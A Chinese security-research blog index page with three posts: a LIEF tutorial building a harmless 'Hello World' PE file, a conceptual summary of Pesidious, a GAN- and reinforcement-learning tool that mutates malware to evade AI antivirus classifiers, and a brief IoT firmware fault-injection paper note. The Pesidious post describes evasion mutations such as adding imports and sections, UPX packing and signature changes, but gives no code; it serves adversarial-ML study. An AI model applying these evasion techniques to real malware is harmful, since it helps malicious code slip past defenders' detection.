      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="LIEF-入门"><a href="#LIEF-入门" class="headerlink" title="LIEF 入门"></a>LIEF 入门</h1><h2 id="1-Parse-and-manipulate-format"><a href="#1-Parse-and-manipulate-format" class="headerlink" title="1. Parse and manipulate format"></a>1. Parse and manipulate format</h2><p>使用<code>lief.PE.parse()</code>创建<code>PE.Binary</code>对象。</p>
<p>访问不同的PE头</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(binary.dos_header)</span><br><span class="line"><span class="built_in">print</span>(binary.header)</span><br><span class="line"><span class="built_in">print</span>(binary.optional_header)</span><br></pre></td></tr></table></figure>

<p>可以通过抽象方法或直接通过PE定义访问类的成员</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Using the abstract layer</span></span><br><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> binary.imported_functions:</span><br><span class="line">  <span class="built_in">print</span>(func)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Using the PE definition</span></span><br><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> binary.imports:</span><br><span class="line">  <span class="built_in">print</span>(func)</span><br></pre></td></tr></table></figure>

<h2 id="2-Create-a-PE-from-scrath"><a href="#2-Create-a-PE-from-scrath" class="headerlink" title="2.Create a PE from scrath"></a>2.Create a PE from scrath</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Description:</span></span><br><span class="line"><span class="comment"># Create a PE which pop a MessageBox</span></span><br><span class="line"><span class="comment"># with the message &quot;Hello World&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lief <span class="keyword">import</span> PE</span><br><span class="line"></span><br><span class="line">title   = <span class="string">&quot;LIEF is awesome\0&quot;</span></span><br><span class="line">message = <span class="string">&quot;Hello World\0&quot;</span></span><br><span class="line"></span><br><span class="line">data =  <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>, title))</span><br><span class="line">data += <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>, message))</span><br><span class="line"><span class="comment"># code 是可执行文件的机器代码，也即程序的执行指令</span></span><br><span class="line">code = [</span><br><span class="line">        <span class="number">0x6a</span>, <span class="number">0x00</span>,                         <span class="comment"># push 0x00 uType</span></span><br><span class="line">        <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,       <span class="comment"># push VA(title)</span></span><br><span class="line">        <span class="number">0x68</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,       <span class="comment"># push VA(message)</span></span><br><span class="line">        <span class="number">0x6a</span>, <span class="number">0x00</span>,                         <span class="comment"># push 0 hWnd</span></span><br><span class="line">        <span class="number">0xFF</span>, <span class="number">0x15</span>, <span class="number">0x54</span>, <span class="number">0x30</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="comment"># call MessageBoxA</span></span><br><span class="line">        <span class="number">0x6A</span>, <span class="number">0x00</span>,                         <span class="comment"># push 0 uExitCode</span></span><br><span class="line">        <span class="number">0xFF</span>, <span class="number">0x15</span>, <span class="number">0x4C</span>, <span class="number">0x30</span>, <span class="number">0x40</span>, <span class="number">0x00</span>  <span class="comment"># call ExitProcess</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化 PE.Binary 实例</span></span><br><span class="line">binary32 = PE.Binary(<span class="string">&quot;pe_from_scratch&quot;</span>, PE.PE_TYPE.PE32)</span><br><span class="line"></span><br><span class="line"><span class="comment"># PE 的 .text section</span></span><br><span class="line">section_text                 = PE.Section(<span class="string">&quot;.text&quot;</span>)</span><br><span class="line">section_text.content         = code</span><br><span class="line">section_text.virtual_address = <span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PE 的 .data section </span></span><br><span class="line">section_data                 = PE.Section(<span class="string">&quot;.data&quot;</span>)</span><br><span class="line">section_data.content         = data</span><br><span class="line">section_data.virtual_address = <span class="number">0x2000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加 section</span></span><br><span class="line">section_text = binary32.add_section(section_text, PE.SECTION_TYPES.TEXT)</span><br><span class="line">section_data = binary32.add_section(section_data, PE.SECTION_TYPES.DATA)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(section_text)</span><br><span class="line"><span class="built_in">print</span>(section_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 PE 文件的入口点为 section_text 也即 .text section</span></span><br><span class="line">binary32.optional_header.addressof_entrypoint = section_text.virtual_address</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加库和导入函数</span></span><br><span class="line">kernel32 = binary32.add_library(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">kernel32.add_entry(<span class="string">&quot;ExitProcess&quot;</span>)</span><br><span class="line"></span><br><span class="line">user32 = binary32.add_library(<span class="string">&quot;user32.dll&quot;</span>)</span><br><span class="line">user32.add_entry(<span class="string">&quot;MessageBoxA&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 预测函数加载到内存后的地址</span></span><br><span class="line">ExitProcess_addr = binary32.predict_function_rva(<span class="string">&quot;kernel32.dll&quot;</span>, <span class="string">&quot;ExitProcess&quot;</span>)</span><br><span class="line">MessageBoxA_addr = binary32.predict_function_rva(<span class="string">&quot;user32.dll&quot;</span>, <span class="string">&quot;MessageBoxA&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Address of &#x27;ExitProcess&#x27;: 0x&#123;:06x&#125; &quot;</span>.<span class="built_in">format</span>(ExitProcess_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Address of &#x27;MessageBoxA&#x27;: 0x&#123;:06x&#125; &quot;</span>.<span class="built_in">format</span>(MessageBoxA_addr))</span><br><span class="line"></span><br><span class="line">builder = PE.Builder(binary32)</span><br><span class="line">builder.build_imports(<span class="literal">True</span>)</span><br><span class="line">builder.build()</span><br><span class="line">builder.write(<span class="string">&quot;pe_from_scratch.exe&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="3-Play-with-ELF-symbols"><a href="#3-Play-with-ELF-symbols" class="headerlink" title="3. Play with ELF symbols"></a>3. Play with ELF symbols</h2><p>修改ELF文件符号。（由于目前关注的是PE文件，暂时跳过这一节）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/12/Pesidious/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.JPG">
      <meta itemprop="name" content="theLonging">
      <meta itemprop="description" content="不捨晝夜。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="talk is cheap, show me the code.">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/04/12/Pesidious/" class="post-title-link" itemprop="url">Pesidious</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2024-04-12 16:13:26 / 修改时间：17:00:59" itemprop="dateCreated datePublished" datetime="2024-04-12T16:13:26+08:00">2024-04-12</time>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.9k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Pesidious"><a href="#Pesidious" class="headerlink" title="Pesidious"></a>Pesidious</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction:"></a>Introduction:</h2><p>Pesidious 是一款开源工具，它使用生成对抗网络 (GAN) 和强化学习 (RL) 来生成可以逃避下一代人工智能防病毒扫描程序的变异恶意软件。</p>
<ul>
<li>样本恶意软件分类器：该工具经过训练可以变异恶意软件，从而可以逃避使用梯度增强算法对恶意软件和良性文件进行分类的样本分类器。</li>
<li>GAN 生成看起来良性的部分和导入：GAN 已用于生成可以使恶意软件看起来更良性的部分和导入。</li>
<li>强化学习模型：强化学习模型经过训练，可以选择最佳的突变序列，包括上述部分和导入内容以及其他部分，以欺骗恶意软件分类器。</li>
</ul>
<p><img src="/../images/Pesidious/%E6%88%AA%E5%B1%8F2024-04-12%2016.18.32.png" alt="截屏2024-04-12 16.18.32"></p>
<h2 id="Train-Models-optional"><a href="#Train-Models-optional" class="headerlink" title="Train Models (optional)"></a>Train Models (optional)</h2><p>该工具使用两种模型来变异恶意软件，以增加规避性并维护功能。</p>
<ul>
<li>生成对抗网络用于为恶意软件样本生成看起来良性的导入和部分。</li>
<li>强化学习用于训练代理为恶意软件样本选择最佳突变序列，以逃避分类器。</li>
</ul>
<h3 id="Step-1-Train-Generative-Adversarial-Network-GAN"><a href="#Step-1-Train-Generative-Adversarial-Network-GAN" class="headerlink" title="Step 1: Train Generative Adversarial Network (GAN)"></a>Step 1: Train Generative Adversarial Network (GAN)</h3><p>生成对抗性网络训练模型可以分为以下部分：</p>
<p><strong>Feature Extraction Component（特征提取组件）</strong>: </p>
<p>特征提取组件对于让我们的人工智能模型理解二进制文件所拥有的特征的更简单表示至关重要。</p>
<p><strong>特征</strong> - 提取出的二进制文件中最相关的组成部分包括：</p>
<ul>
<li><strong>节名称（Section names）</strong></li>
<li><strong>导入库和函数（Import libraries and functions）</strong></li>
</ul>
<p><strong>特征向量映射（Feature Vector Map）</strong>- 所有独特的特征都被存储在一个映射中。</p>
<p><strong>二进制特征向量（Binary Feature Vectors）</strong>- 随后，二进制文件通过使用特征向量映射被转换为二进制表示形式。</p>
<p><strong>Table 1: Simplified representation of feature vector map</strong></p>
<table>
<thead>
<tr>
<th>Feature</th>
<th>Index</th>
</tr>
</thead>
<tbody><tr>
<td>ConversionListA : inn32.dll</td>
<td>1</td>
</tr>
<tr>
<td>OdQueryStringA : user32.dll</td>
<td>2</td>
</tr>
<tr>
<td>GetTabbedTextExtentA : user32.dll</td>
<td>3</td>
</tr>
<tr>
<td>…</td>
<td>4</td>
</tr>
<tr>
<td>…</td>
<td>5</td>
</tr>
<tr>
<td>…</td>
<td>6</td>
</tr>
<tr>
<td><function_name><dll name></td>
<td>7</td>
</tr>
</tbody></table>
<p><strong>Table 2: Simplified representation of a binary feature vector</strong></p>
<table>
<thead>
<tr>
<th>Feature Index</th>
<th>Boolean</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>2</td>
<td>0</td>
</tr>
<tr>
<td>3</td>
<td>0</td>
</tr>
<tr>
<td></td>
<td>1</td>
</tr>
<tr>
<td></td>
<td>1</td>
</tr>
<tr>
<td></td>
<td>0</td>
</tr>
<tr>
<td><feature_index></td>
<td>&lt;Exist&#x2F;Doesn’t Exist&gt;</td>
</tr>
</tbody></table>
<p> <strong>Adversarial Features Generation Component（对抗性特征生成组件）</strong>:</p>
<p>一旦我们对二进制文件有了更简单的表示，我们就可以用它来训练我们的生成对抗网络（GAN）。我们的GAN包括三个组成部分：</p>
<ul>
<li><strong>生成器</strong> - 这是一个人工智能模型，负责生成看起来良性的特征，同时尝试保留恶意功能。</li>
<li><strong>检测器</strong> - 这是一个人工智能模型，负责检测生成器输出的内容是恶意的还是良性的。然后检测器向生成器提供反馈，以便它在下一次迭代中进行改进。</li>
<li><strong>黑盒检测器</strong> - 这个组件使用在杀毒软件中用于分类生成器输出的人工智能模型进行训练，帮助检测器做出决策。</li>
</ul>
<h3 id="Step-2-Train-Reinforcement-Learning-RL-Agent"><a href="#Step-2-Train-Reinforcement-Learning-RL-Agent" class="headerlink" title="Step 2: Train Reinforcement Learning (RL) Agent"></a>Step 2: Train Reinforcement Learning (RL) Agent</h3><p>强化学习训练模块将包括以下内容：</p>
<ul>
<li><strong>恶意软件环境</strong> - 这是一个将帮助代理通过代理选择的变异来分类和评分变异样本的环境。</li>
<li><strong>代理</strong> - 一个神经网络模型，学习恶意软件样本的变异序列，这些变异可以逃避分类器的检测。</li>
<li><strong>突变</strong> - 当前工具中可用的各种变异如下：<ul>
<li>添加导入（查询GAN模型）</li>
<li>添加节（查询GAN模型）</li>
<li>向节中追加字节</li>
<li>重命名节</li>
<li>UPX打包</li>
<li>UPX解包</li>
<li>添加&#x2F;删除签名</li>
<li>追加随机数量的字节</li>
</ul>
</li>
<li><strong>分类器</strong> - 一个人工智能模型，能够接收一个二进制文件作为输入，并将其分类为恶意软件或良性文件。默认情况下，该工具使用一个样本梯度提升分类器。</li>
</ul>
<h2 id="Mutate-Malware"><a href="#Mutate-Malware" class="headerlink" title="Mutate Malware"></a>Mutate Malware</h2><p>这个工具可以用来创建能够逃避基于人工智能的分类器检测的变异恶意软件。</p>
<h3 id="Step-1-Get-the-original-scores-of-malware-samples-获取恶意软件样本的原始分数"><a href="#Step-1-Get-the-original-scores-of-malware-samples-获取恶意软件样本的原始分数" class="headerlink" title="Step 1: Get the original scores of malware samples 获取恶意软件样本的原始分数"></a>Step 1: Get the original scores of malware samples 获取恶意软件样本的原始分数</h3><p>为了评估工具生成的变异恶意软件的逃避能力，你可以首先使用分类器对恶意软件样本进行测试。</p>
<h3 id="Step-2-Mutate-malware-files-突变恶意文件"><a href="#Step-2-Mutate-malware-files-突变恶意文件" class="headerlink" title="Step 2: Mutate malware files 突变恶意文件"></a>Step 2: Mutate malware files 突变恶意文件</h3><p>这个工具配备了预训练模型，可以变异恶意软件以逃避内置的分类器。</p>
<h3 id="Step-3-Check-the-score-for-mutated-malware-检查变异后的恶意软件的分数"><a href="#Step-3-Check-the-score-for-mutated-malware-检查变异后的恶意软件的分数" class="headerlink" title="Step 3: Check the score for mutated malware 检查变异后的恶意软件的分数"></a>Step 3: Check the score for mutated malware 检查变异后的恶意软件的分数</h3><p>您可以再次运行分类器，但要对抗突变的恶意软件，并将其与第一步中检索到的原始分数进行比较 </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/03/24/ifizz/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.JPG">
      <meta itemprop="name" content="theLonging">
      <meta itemprop="description" content="不捨晝夜。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="talk is cheap, show me the code.">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/03/24/ifizz/" class="post-title-link" itemprop="url">ifizz</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-03-24 13:34:51" itemprop="dateCreated datePublished" datetime="2024-03-24T13:34:51+08:00">2024-03-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-03-26 18:38:16" itemprop="dateModified" datetime="2024-03-26T18:38:16+08:00">2024-03-26</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>316</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="IFIZZ-Deep-State-and-Efficient-Fault-Scenario-Generation-to-Test-IoT-Firmware"><a href="#IFIZZ-Deep-State-and-Efficient-Fault-Scenario-Generation-to-Test-IoT-Firmware" class="headerlink" title="IFIZZ: Deep-State and Efficient Fault-Scenario Generation to Test IoT Firmware"></a>IFIZZ: Deep-State and Efficient Fault-Scenario Generation to Test IoT Firmware</h1><h2 id="背景："><a href="#背景：" class="headerlink" title="背景："></a>背景：</h2><ul>
<li>错误处理代码<code>(error-handling code)</code>由于难以被测试，其本身就是error-prone的</li>
<li>错误处理代码中的<code>bug</code>由于难以被探测，可能持续存在很长一段时间。</li>
<li>虽然已经存在像<code>fuzzing</code>的动态探测方法，但是他们在处理由输入无关错误触发的bug时有很大的局限性</li>
</ul>
<h2 id="问题：设计一个有效的错误注入方法用于测试IoT固件中的错误检测代码"><a href="#问题：设计一个有效的错误注入方法用于测试IoT固件中的错误检测代码" class="headerlink" title="问题：设计一个有效的错误注入方法用于测试IoT固件中的错误检测代码"></a>问题：设计一个有效的错误注入方法用于测试<code>IoT</code>固件中的错误检测代码</h2><ul>
<li><h3 id="挑战一：自动识别输入无关错误"><a href="#挑战一：自动识别输入无关错误" class="headerlink" title="挑战一：自动识别输入无关错误"></a>挑战一：自动识别输入无关错误</h3></li>
<li><h3 id="挑战二：测试深度的错误路径"><a href="#挑战二：测试深度的错误路径" class="headerlink" title="挑战二：测试深度的错误路径"></a>挑战二：测试深度的错误路径</h3></li>
</ul>
<h2 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h2><h3 id="自动鉴别输入无关错误："><a href="#自动鉴别输入无关错误：" class="headerlink" title="自动鉴别输入无关错误："></a>自动鉴别输入无关错误：</h3><ul>
<li>观察一：错误代码作为返回值，并且将会在调用函数中检查。</li>
<li></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="theLonging"
      src="/images/touxiang.JPG">
  <p class="site-author-name" itemprop="name">theLonging</p>
  <div class="site-description" itemprop="description">不捨晝夜。</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">43</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/chantchanH7" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;chantchanH7" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/562879980@qq.com" title="E-Mail → 562879980@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2023-07 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">theLonging</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">452k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">6:51</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>



    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
    <span class="post-meta-divider">|</span>
<!-- 不蒜子计数初始值纠正 -->
<script>
$(document).ready(function() {

    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
    var countOffset = 20000;  // 初始化首次数据

    function fixCount() {            
       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
        {
            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
            clearInterval(int);
        }                  
        if ($("#busuanzi_container_site_pv").css("display") != "none")
        {
            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
            clearInterval(int); // 停止检测
        }  
    }
       	
});
</script> 


        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
